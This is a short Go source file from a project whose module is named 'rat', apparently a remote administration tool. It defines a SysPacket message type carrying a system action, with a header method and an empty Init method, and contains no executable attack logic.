package main

import (
	"rat/shared"
	"rat/shared/system"
)

type SysPacket struct {
	Action system.Action `network:"send"`
}

func (packet SysPacket) Header() shared.PacketHeader {
	return shared.SysHeader
}

func (packet SysPacket) Init(c *Client) {

}
